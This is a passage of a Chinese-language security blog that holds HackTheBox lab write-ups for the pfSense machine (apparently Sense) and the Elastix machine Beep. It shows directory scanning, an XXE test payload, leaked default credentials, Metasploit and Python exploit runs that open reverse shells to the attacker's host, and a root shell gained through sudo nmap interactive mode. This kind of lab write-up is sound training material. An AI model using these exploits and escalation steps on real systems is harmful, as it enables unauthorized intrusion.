class="line"><span class="comment">---- Entering directory: https://10.10.10.60/themes/ ----</span></span><br><span class="line"></span><br><span class="line"><span class="comment">---- Entering directory: https://10.10.10.60/tree/ ----</span></span><br><span class="line">+  (CODE:200|SIZE:7492)</span><br><span class="line"></span><br><span class="line"><span class="comment">---- Entering directory: https://10.10.10.60/widgets/ ----</span></span><br><span class="line">==&gt; DIRECTORY: https://10.10.10.60/widgets/include/</span><br><span class="line">==&gt; DIRECTORY: https://10.10.10.60/widgets/javascript/</span><br><span class="line">==&gt; DIRECTORY: https://10.10.10.60/widgets/widgets/</span><br><span class="line"></span><br><span class="line"><span class="comment">---- Entering directory: https://10.10.10.60/javascript/index/ ----</span></span><br><span class="line"></span><br><span class="line"><span class="comment">---- Entering directory: https://10.10.10.60/javascript/jquery/ ----</span></span><br><span class="line">==&gt; DIRECTORY: https://10.10.10.60/javascript/jquery/images/</span><br><span class="line"></span><br><span class="line"><span class="comment">---- Entering directory: https://10.10.10.60/javascript/wizard/ ----</span></span><br><span class="line"></span><br><span class="line"><span class="comment">---- Entering directory: https://10.10.10.60/widgets/include/ ----</span></span><br><span class="line"></span><br><span class="line"><span class="comment">---- Entering directory: https://10.10.10.60/widgets/javascript/ ----</span></span><br><span class="line"></span><br><span class="line"><span class="comment">---- Entering directory: https://10.10.10.60/widgets/widgets/ ----</span></span><br><span class="line"></span><br><span class="line"><span class="comment">---- Entering directory: https://10.10.10.60/javascript/jquery/images/ ----</span></span><br></pre></td></tr></table></figure>

<h3 id="xmlrpc-php"><a href="#xmlrpc-php" class="headerlink" title="/xmlrpc.php"></a>/xmlrpc.php</h3><p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1590731574070-bd7757a6-e59e-4f3e-8ba0-b994cbbeb732.png#align=left&display=inline&height=67&margin=%5Bobject%20Object%5D&name=image.png&originHeight=133&originWidth=842&size=22571&status=done&style=none&width=421" alt="image.png"></p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [ &lt;!ENTITY % pe SYSTEM "http://10.10.14.4:88"&gt; %pe; %param1; ]&gt;</span><br><span class="line">&lt;foo&gt;&amp;external;&lt;/foo&gt;</span><br></pre></td></tr></table></figure>

<p>测试过，无 xxe 问题</p>
<h3 id="tree-index-html"><a href="#tree-index-html" class="headerlink" title="/tree/index.html"></a>/tree/index.html</h3><p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1590733092577-5ab408a8-e773-4d0e-89fb-004d49d1e546.png#align=left&display=inline&height=987&margin=%5Bobject%20Object%5D&name=dragonfly.png&originHeight=987&originWidth=1910&size=236078&status=done&style=none&width=1910" alt="dragonfly.png"></p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">   Connect to host via SSH:</span><br><span class="line">   &lt;applet CODEBASE="." ARCHIVE="jta20.jar" CODE="de.mud.jta.Applet" WIDTH=55 HEIGHT=25&gt;</span><br><span class="line">&lt;param NAME="config" VALUE="applet.conf"&gt;</span><br><span class="line">   &lt;/applet&gt;</span><br></pre></td></tr></table></figure>

<p>不知道啥意思。。。</p>
<h1 id="breakthrough"><a href="#breakthrough" class="headerlink" title="breakthrough"></a>breakthrough</h1><p>用 dirbuster 再扫目录，用最大的字典</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br></pre></td></tr></table></figure>

<p>find something juicy，发现了些好东西</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># https://10.10.10.60//changelog.txt</span></span><br><span class="line">//内容如下</span><br><span class="line"><span class="comment"># Security Changelog</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### Issue</span></span><br><span class="line">There was a failure in updating the firewall. Manual patching is therefore required</span><br><span class="line"></span><br><span class="line"><span class="comment">### Mitigated</span></span><br><span class="line">2 of 3 vulnerabilities have been patched.</span><br><span class="line"></span><br><span class="line"><span class="comment">### Timeline</span></span><br><span class="line">The remaining patches will be installed during the next maintenance window</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># https://10.10.10.60/system-users.txt</span></span><br><span class="line">//内容如下</span><br><span class="line"><span class="comment">####Support ticket###</span></span><br><span class="line"></span><br><span class="line">Please <span class="keyword">create</span> the <span class="keyword">following</span> <span class="keyword">user</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">username: Rohit</span><br><span class="line"><span class="keyword">password</span>: company <span class="keyword">defaults</span></span><br></pre></td></tr></table></figure>

<p>公司默认密码？osint，搜索引擎走起<br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1590766665129-28940fa6-a83a-4b18-b6ae-66eb2fd4de86.png#align=left&display=inline&height=450&margin=%5Bobject%20Object%5D&name=image.png&originHeight=899&originWidth=1554&size=143893&status=done&style=none&width=777" alt="image.png"></p>
<p>直接登录了哦，<br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1590766843344-cc662a21-85d7-4ac0-bfbd-62ddf43506c4.png#align=left&display=inline&height=942&margin=%5Bobject%20Object%5D&name=logined.png&originHeight=942&originWidth=1613&size=177747&status=done&style=none&width=1613" alt="logined.png"></p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(unix/http/pfsense_graph_injection_exec) &gt; set username rohit</span><br><span class="line">username =&gt; rohit</span><br><span class="line">msf5 exploit(unix/http/pfsense_graph_injection_exec) &gt; set password pfsense</span><br><span class="line">password =&gt; pfsense</span><br><span class="line">msf5 exploit(unix/http/pfsense_graph_injection_exec) &gt; set lhost tun0</span><br><span class="line">lhost =&gt; 10.10.16.122</span><br><span class="line">msf5 exploit(unix/http/pfsense_graph_injection_exec) &gt; set rhosts 10.10.10.60</span><br><span class="line">rhosts =&gt; 10.10.10.60</span><br><span class="line">msf5 exploit(unix/http/pfsense_graph_injection_exec) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.16.122:4444</span><br><span class="line">[*] Detected pfSense 2.1.3-RELEASE, uploading intial payload</span><br><span class="line">[*] Payload uploaded successfully, executing</span><br><span class="line">[*] Sending stage (38288 bytes) to 10.10.10.60</span><br><span class="line">[*] Meterpreter session 1 opened (10.10.16.122:4444 -&gt; 10.10.10.60:39519) at 2020-05-29 23:26:58 +0800</span><br></pre></td></tr></table></figure>

<p>或者用 searchexploit 里的 exp 拿 shell<br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1590767623073-864541e9-c3ab-45f9-97e5-4db13ce45006.png#align=left&display=inline&height=141&margin=%5Bobject%20Object%5D&name=py-exp.png&originHeight=141&originWidth=1187&size=57572&status=done&style=none&width=1187" alt="py-exp.png"></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python3 43560.py --rhost 10.10.10.60  --lhost 10.10.16.122 --lport 1337 --username rohit --password pfsense</span></span><br></pre></td></tr></table></figure>

<h1 id="复盘"><a href="#复盘" class="headerlink" title="复盘"></a>复盘</h1><p>一开始根本没锁定这个 pfSense,还是经验不够了，只注意了 lighttpd</p>
<ol>
<li>icon 跟 body 其实都有蛛丝马迹<img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1590766699999-b025290e-5406-4518-88bd-79875e00d0d8.png#align=left&display=inline&height=989&margin=%5Bobject%20Object%5D&name=clue.png&originHeight=989&originWidth=1919&size=331603&status=done&style=none&width=1919" alt="clue.png"></li>
<li>enumeration！<br>常用扫目录工具有 dirbuster+ dirb + wfuzz</li>
</ol>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://unc1e.com/2020/05/25/yuque/HackTheBox%EF%BC%9ABeep%E7%AC%94%E8%AE%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Unc1e">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Unc1e的博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/05/25/yuque/HackTheBox%EF%BC%9ABeep%E7%AC%94%E8%AE%B0/" itemprop="url">HackTheBox：Beep笔记</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-05-25T01:40:15+08:00">
                2020-05-25
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="elastix"><a href="#elastix" class="headerlink" title="elastix"></a>elastix</h2><p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1590342051488-5f1b2b4e-e643-47ad-b8d1-92e70849ad3a.png#align=left&display=inline&height=401&margin=%5Bobject%20Object%5D&name=image.png&originHeight=801&originWidth=1752&size=711881&status=done&style=none&width=876" alt="image.png"></p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(unix/http/freepbx_callmenum) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/unix/http/freepbx_callmenum):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting      Required  Description</span><br><span class="line">   <span class="comment">----       ---------------      --------  -----------</span></span><br><span class="line">   EXTENSION  230-240              yes       A range of Local extension numbers</span><br><span class="line">   Proxies    http:127.0.0.1:8080  no        A proxy chain of format type:host:port[,type:host:port][...]</span><br><span class="line">   RHOSTS     10.10.10.7           yes       The target host(s), range CIDR identifier, or hosts file <span class="keyword">with</span> syntax <span class="string">'file:&lt;path&gt;'</span></span><br><span class="line">   RPORT      <span class="number">443</span>                  yes       The target port (TCP)</span><br><span class="line">   SSL        <span class="literal">true</span>                 <span class="keyword">no</span>        Negotiate SSL/TLS <span class="keyword">for</span> outgoing connections</span><br><span class="line">   VHOST                           <span class="keyword">no</span>        <span class="keyword">HTTP</span> <span class="keyword">server</span> <span class="keyword">virtual</span> host</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (cmd/unix/<span class="keyword">reverse</span>):</span><br><span class="line"></span><br><span class="line">   <span class="keyword">Name</span>   <span class="keyword">Current</span> Setting  <span class="keyword">Required</span>  Description</span><br><span class="line">   <span class="comment">----   ---------------  --------  -----------</span></span><br><span class="line">   LHOST  <span class="number">10.10</span><span class="number">.16</span><span class="number">.122</span>     yes       The listen address (an <span class="keyword">interface</span> may be specified)</span><br><span class="line">   LPORT  <span class="number">4444</span>             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   <span class="keyword">Id</span>  <span class="keyword">Name</span></span><br><span class="line">   <span class="comment">--  ----</span></span><br><span class="line">   <span class="number">0</span>   <span class="keyword">Automatic</span> Target</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(unix/<span class="keyword">http</span>/freepbx_callmenum) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started <span class="keyword">reverse</span> TCP <span class="keyword">double</span> <span class="keyword">handler</span> <span class="keyword">on</span> <span class="number">10.10</span><span class="number">.16</span><span class="number">.122</span>:<span class="number">4444</span></span><br><span class="line">[*] <span class="number">10.10</span><span class="number">.10</span><span class="number">.7</span>:<span class="number">443</span> - Sending evil request <span class="keyword">with</span> <span class="keyword">range</span> <span class="number">230</span></span><br><span class="line">[*] <span class="number">10.10</span><span class="number">.10</span><span class="number">.7</span>:<span class="number">443</span> - Sending evil request <span class="keyword">with</span> <span class="keyword">range</span> <span class="number">231</span></span><br><span class="line">[*] <span class="number">10.10</span><span class="number">.10</span><span class="number">.7</span>:<span class="number">443</span> - Sending evil request <span class="keyword">with</span> <span class="keyword">range</span> <span class="number">232</span></span><br><span class="line">[*] <span class="number">10.10</span><span class="number">.10</span><span class="number">.7</span>:<span class="number">443</span> - Sending evil request <span class="keyword">with</span> <span class="keyword">range</span> <span class="number">233</span></span><br><span class="line">[*] <span class="number">10.10</span><span class="number">.10</span><span class="number">.7</span>:<span class="number">443</span> - Sending evil request <span class="keyword">with</span> <span class="keyword">range</span> <span class="number">234</span></span><br><span class="line">[*] Accepted the <span class="keyword">first</span> <span class="keyword">client</span> connection...</span><br><span class="line">[*] Accepted the <span class="keyword">second</span> <span class="keyword">client</span> connection...</span><br><span class="line">[*] Command: echo qaF1oILSz5kNCclV;</span><br><span class="line">[*] Writing to socket A</span><br><span class="line">[*] Writing to socket B</span><br><span class="line">[*] Reading from sockets...</span><br><span class="line">[*] Reading from socket B</span><br><span class="line">[*] B: "qaF1oILSz5kNCclV\r\n"</span><br><span class="line">[*] Matching...</span><br><span class="line">[*] A is input...</span><br><span class="line">[*] Command shell session 1 opened (10.10.16.122:4444 -&gt; 10.10.10.7:39534) at 2020-05-25 01:37:26 +0800</span><br></pre></td></tr></table></figure>

<h2 id="issue-to-fix"><a href="#issue-to-fix" class="headerlink" title="issue to fix"></a>issue to fix</h2><p>set ssl true</p>
<p><strong>issue</strong></p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(unix/http/freepbx_callmenum) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP double handler on 10.10.16.122:4444</span><br><span class="line">[*] 10.10.10.7:443 - Sending evil request with range 200</span><br><span class="line">[*] 10.10.10.7:443 - Sending evil request with range 201</span><br><span class="line">^C[-] Exploit failed [user-interrupt]: Interrupt</span><br><span class="line">[-] run: Interrupted</span><br><span class="line">msf5 exploit(unix/http/freepbx_callmenum) &gt; show options Interrupt: use the 'exit' command to quit</span><br></pre></td></tr></table></figure>

<p>OPENSSL too new, auto discard low versio df key.</p>
<p><strong>solution</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># use burp to proxy</span></span><br><span class="line"><span class="keyword">set</span> proxies <span class="keyword">http</span>:<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8080</span></span><br><span class="line"><span class="keyword">set</span> ReverseAllowProxy <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">or</span> <span class="keyword">use</span> it(<span class="keyword">unused</span>)</span><br><span class="line"></span><br><span class="line">sed -i <span class="string">'s,^\(MinProtocol[ ]*=\).*,\1'</span>TLSv1<span class="number">.0</span><span class="string">',g'</span> /etc/ssl/openssl.cnf</span><br><span class="line">$ sed -i <span class="string">'s,^\(CipherString[ ]*=\).*,\1'</span><span class="keyword">DEFAULT</span>@SECLEVEL=<span class="number">1</span><span class="string">',g'</span> /etc/ssl/openssl.cnf</span><br></pre></td></tr></table></figure>

<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>查看信息</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br><span class="line">Matching Defaults entries for asterisk on this host:</span><br><span class="line">    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR</span><br><span class="line">    LS_COLORS MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE LC_COLLATE</span><br><span class="line">    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES LC_MONETARY LC_NAME LC_NUMERIC</span><br><span class="line">    LC_PAPER LC_TELEPHONE LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET</span><br><span class="line">    XAUTHORITY"</span><br><span class="line"></span><br><span class="line">User asterisk may run the following commands on this host:</span><br><span class="line">    (root) NOPASSWD: /sbin/shutdown</span><br><span class="line">    (root) NOPASSWD: /usr/bin/nmap</span><br><span class="line">    (root) NOPASSWD: /usr/bin/yum</span><br><span class="line">    (root) NOPASSWD: /bin/touch</span><br><span class="line">    (root) NOPASSWD: /bin/chmod</span><br><span class="line">    (root) NOPASSWD: /bin/chown</span><br><span class="line">    (root) NOPASSWD: /sbin/service</span><br><span class="line">    (root) NOPASSWD: /sbin/init</span><br><span class="line">    (root) NOPASSWD: /usr/sbin/postmap</span><br><span class="line">    (root) NOPASSWD: /usr/sbin/postfix</span><br><span class="line">    (root) NOPASSWD: /usr/sbin/saslpasswd2</span><br><span class="line">    (root) NOPASSWD: /usr/sbin/hardware_detector</span><br><span class="line">    (root) NOPASSWD: /sbin/chkconfig</span><br><span class="line">    (root) NOPASSWD: /usr/sbin/elastix-helper</span><br></pre></td></tr></table></figure>

<p>发现个 nmap，交互式直接得 shell，开冲</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># id</span></span><br><span class="line"><span class="comment"># uid=100(asterisk) gid=101(asterisk)</span></span><br><span class="line"><span class="comment"># sudo nmap --interactive</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ )</span></span><br><span class="line"><span class="comment"># Welcome to Interactive Mode -- press h &lt;enter&gt; for help</span></span><br><span class="line"><span class="comment"># nmap&gt; !sh</span></span><br><span class="line"><span class="comment"># id</span></span><br><span class="line"><span class="comment"># uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)</span></span><br></pre></td></tr></table></figure>

<p>ref</p>
<ul>
<li><a href="https://github.com/rapid7/metasploit-framework/issues/6783" target="_blank" rel="noopener">https://github.com/rapid7/metasploit-framework/issues/6783</a></li>
<li><a href="https://blog.csdn.net/fastergohome/article/details/104165920" target="_blank" rel="noopener">https://blog.csdn.net/fastergohome/article/details/104165920</a></li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/">&lt;i class&#x3D;&quot;fa fa-angle-right&quot;&gt;&lt;&#x2F;i&gt;</a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">Unc1e</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/%20%7C%7C%20archive">
              
                  <span class="site-state-item-count">19</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            

            

          </nav>

          

          

          
          

          
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Unc1e</span>

  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  

  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
